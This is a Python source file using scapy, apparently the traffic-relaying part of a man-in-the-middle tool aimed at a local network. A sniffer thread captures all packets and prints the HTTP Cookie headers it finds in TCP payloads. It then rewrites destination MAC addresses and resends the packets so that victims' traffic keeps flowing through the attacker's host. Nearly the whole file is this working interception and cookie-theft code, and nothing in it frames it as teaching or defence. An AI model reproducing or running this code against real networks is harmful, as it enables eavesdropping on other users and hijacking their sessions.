import threading

from scapy.layers.inet import IP, sniff, sendp
import re


class PacketSniffer(threading.Thread):

    def __init__(self, attacker_ips, ip_to_mac, network_interface):
        super(PacketSniffer, self).__init__()
        self.network_interface = network_interface
        self.attacker_ips = attacker_ips
        self.ip_to_mac = ip_to_mac

    def run(self):
        sniff(
            iface=self.network_interface,
            store=0,
            # filter="tcp and port 80", # @todo move this filtering to a later point in time, filtering here would break the victims network
            prn=self.handle_packet
        )

    def handle_packet(self, packet):
        """
        :param Ether packet:
        :return:
        """
        tcp = packet.getlayer("TCP")
        if tcp is not None:
            match = re.search(r"Cookie: (.+)", str(tcp.payload))
            if match:
                print(match.group(1))

        # Only consider packets with an IP part.
        if IP in packet:
            # Try to lookup the actual mac address of the package
            if packet[IP].dst not in self.ip_to_mac:
                print('received a packet for an unknown host (%s)' % packet[IP].dst)
            else:
                target_dst = self.ip_to_mac[packet[IP].dst]

                # Ignore packets target towards our self or already correctly targeted packets, since either we generated
                # them or they are legitimate packets originating from our own host.
                if packet[IP].dst not in self.attacker_ips and target_dst != packet.dst:
                    print('redirecting a packet from %s (%s) to %s' % (packet.dst, packet[IP].dst, target_dst))
                    packet.dst = target_dst
                    sendp(packet)
